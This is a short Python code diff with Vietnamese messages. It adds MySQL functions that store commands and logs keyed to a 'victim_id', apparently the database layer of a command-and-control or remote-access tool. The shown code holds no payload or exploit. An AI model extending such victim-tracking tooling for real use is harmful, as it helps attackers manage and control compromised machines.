@@ -60,3 +60,29 @@ def get_victimid_by_ip(host):
         if conn.is_connected():
             conn.close()
             print("Đã đóng kết nối cơ sở dữ liệu.")
+    
+def insert_command(conn, victimid, command, status, execution_time):
+    try:
+        cursor = conn.cursor()
+        query = """
+            INSERT INTO commands (victim_id, command_text, status, execution_time) 
+            VALUES (%s, %s, %s, %s)
+        """
+        cursor.execute(query, (victimid, command, status, execution_time))
+        conn.commit()
+        print(f"Đã lưu lệnh command {command} vào cơ sở dữ liệu.")
+    except mysql.connector.Error as e:
+        print(f"Lỗi khi lưu vào cơ sở dữ liệu: {e}")
+
+def insert_log(conn, victimid, type, created_at):
+    try:
+        cursor = conn.cursor()
+        query = """
+            INSERT INTO logs (victim_id, log_type, created_at) 
+            VALUES (%s, %s, %s)
+        """
+        cursor.execute(query, (victimid, type, created_at))
+        conn.commit()
+        print(f"Đã lưu lệnh log {type} vào cơ sở dữ liệu.")
+    except mysql.connector.Error as e:
+        print(f"Lỗi khi lưu vào cơ sở dữ liệu: {e}")
